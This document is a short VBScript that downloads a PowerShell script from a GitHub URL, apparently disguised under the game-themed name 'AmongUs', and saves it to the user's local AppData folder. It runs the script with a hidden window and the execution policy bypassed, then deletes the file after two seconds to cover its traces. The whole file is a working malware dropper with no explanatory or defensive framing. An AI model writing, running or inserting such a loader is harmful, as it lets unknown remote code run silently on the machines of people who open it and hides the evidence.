Set objHTTP = CreateObject("MSXML2.XMLHTTP")
Set objFSO = CreateObject("Scripting.FileSystemObject")

url = "https://raw.githubusercontent.com/AmjadBalls/TEST/refs/heads/main/AmongUs.ps1"
filePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%LocalAppData%") & "\C4.ps1"

objHTTP.open "GET", url, False
objHTTP.send

If objHTTP.Status = 200 Then
    Set objFile = objFSO.CreateTextFile(filePath, True)
    objFile.Write objHTTP.responseText
    objFile.Close

    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""& '" & filePath & "'""", 0, False

    WScript.Sleep 2000
    objFSO.DeleteFile(filePath)
Else
    MsgBox "Failed to download the script.", vbCritical, "Error"
End If
